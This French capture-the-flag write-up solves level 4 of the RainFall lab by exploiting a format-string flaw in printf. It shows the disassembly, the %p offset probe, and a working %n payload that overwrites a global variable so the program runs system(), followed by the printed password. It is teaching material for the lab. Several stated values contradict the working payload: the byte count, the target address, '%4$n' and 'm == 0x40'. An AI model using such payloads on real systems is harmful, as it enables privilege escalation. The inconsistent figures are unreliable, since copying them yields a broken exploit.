# Level4: FORMAT STRING

### Première étape — tester le programme

```bash
$ ./level4
a
a
```

Le programme affiche l'entrée.

### Ouvrons le binaire
```s
08048444 <p>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	8b 45 08             	mov    0x8(%ebp),%eax
 804844d:	89 04 24             	mov    %eax,(%esp)
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
 8048455:	c9                   	leave  
 8048456:	c3                   	ret    

08048457 <n>:
 8048457:	55                   	push   %ebp
 8048458:	89 e5                	mov    %esp,%ebp
 804845a:	81 ec 18 02 00 00    	sub    $0x218,%esp
 8048460:	a1 04 98 04 08       	mov    0x8049804,%eax
 8048465:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048469:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 8048470:	00 
 8048471:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 8048477:	89 04 24             	mov    %eax,(%esp)
 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
 804847f:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 8048485:	89 04 24             	mov    %eax,(%esp)
 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
 804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
 8048497:	75 0c                	jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08 	movl   $0x8048590,(%esp)
 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
 80484a5:	c9                   	leave  
 80484a6:	c3                   	ret    

080484a7 <main>:
 80484a7:	55                   	push   %ebp
 80484a8:	89 e5                	mov    %esp,%ebp
 80484aa:	83 e4 f0             	and    $0xfffffff0,%esp
 80484ad:	e8 a5 ff ff ff       	call   8048457 <n>
 80484b2:	c9                   	leave  
 80484b3:	c3                   	ret    
```

La première chose que nous pouvons remarquer, c'est que contrairement au niveau précédent nous n'avons pas `gets()` mais `fgets()` (version protégée). Plus loin nous voyons un appel à `printf` particulier : regardons cela de plus près.

```c
void p(char *param_1)

{
  printf(param_1);
  return;
}

```

- 1ᵉʳ constat : `printf()` prend en paramètre **seulement** le buffer retourné par `fgets()` c'est très dangereux.
- 2ᵉᵐᵉ constat : il existe une condition qui lance un shell (`system`) si `m == 0x1025544` c'est notre objectif pour obtenir le cat de .pass du level5.
- 3ᵉᵐᵉ constat : `m` est une variable globale dans la `.bss` comparée à `0x1025544` (16930116 decimal).

> _INFO :_ Comme nous le savons, modifier EAX dans GDB au moment du `cmp` ne suffit pas car le kernel set le **SUIDbinary= RUID**. L'objectif ici est donc de **bypasser la condition à l'exécution** en écrivant la valeur `0x1025544` dans la variable `m` **depuis** l'exécution normale, via une vulnérabilité de format string.

`fgets` empêche l'overflow classique, donc `ret2ret`/ret-overflow n'est pas applicable ici. En revanche `printf(local_20c)` nous donne une voie : **format string exploit**.

### Calculez l'offset pour l'attaque

Maintenant que nous avons notre point d'entrée (`printf`) et que nous savons que nous devons bypasser `if (m == 0x40)`, nous allons trouver quel paramètre de notre `printf` contient notre donnée.

```bash
level4@RainFall:~$ ./level4
python -c 'print "AAAA" + ".%p"*(20)' | ./level4
AAAA.0xb7ff26b0.0xbffff794.0xb7fd0ff4.(nil).(nil).0xbffff758.0x804848d.0xbffff550.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025
```

La présence de `0x41414141` (ASCII de `AAAA`) dans la sortie indique que **notre chaîne `AAAA` est présente** à la position d'argument correspondante dans la pile. On utilise donc `%p`/`%x` pour **trouver l'offset** : l'index d'argument de `printf` où se trouve notre donnée.

> _Attention_ : `0x41414141` n'est **pas** automatiquement l'EIP. C'est la valeur `AAAA` trouvée sur la pile. Pour confirmer si l'EIP est écrasé, il faut regarder les registres et la pile dans GDB après un crash.

Maintenant que nous savons que le 12ᵉ paramètre correspond à `AAAA`, on peut utiliser cet offset pour écrire dans la variable `m`.

Nous pouvons le confirmer grace a cette commande :
```bash
level4@RainFall:~$ ./level4
AAAA%12$x
AAAA41414141 #Nous avons le bon offset !
```

### Cherchez l'adresse de la variable `m`

Puisque `m` est dans la section `.bss`, on peut trouver son adresse avec `objdump` (ou `readelf`/`nm`). Exemple extrait :

```bash
level4@RainFall:~$ objdump -t ./level4 | grep "\bm\b"
08049810 g     O .bss	00000004              m
```

Ici l'adresse de `m` est `0x08049810`.

### Créer l'exploit

Principe :
- Placer l'adresse de `m` (little-endian) dans l'entrée pour que `printf` la lise comme argument.
- Imprimer un total de 6416930116 octets - le target (4 octets) puis utiliser `%6416930112c%14$n` pour écrire le nombre total d'octets imprimés dans l'adresse `m`.
- Utiliser l'**offset** trouvé auparavant (ici 12) pour indiquer quel argument contient l'adresse.

Exemple de payload :

```bash
python -c 'print b"\x8c\x98\x04\x08" + b"%6416930112c%12$n"'
```

Explication :
- `"\x8c\x98\x04\x08"` : adresse de `m` (little-endian).
- `"%4$n"` : on utilise la position 4 (offset) et `%n` pour écrire un octet (la valeur 64) à l'adresse pointée par le 4ᵉ argument.

**Note** : selon l'alignement et la libc, il peut être nécessaire d'ajuster l'offset ou d'utiliser `%n`/`%hn` selon le type de la variable. Les spécificateurs positionnels (`%N$...`) rendent souvent l'exploit plus fiable.

### Exécution (exemple)

```bash
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08"+  b"%16930112c%12$n"' | ./level4
-----
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Tada ! L'écriture a fonctionné, la condition `m == 0x1025544` est vraie, le shell est lancé et cat nous affiche bien le flag.

Bonne chance et have fun :)

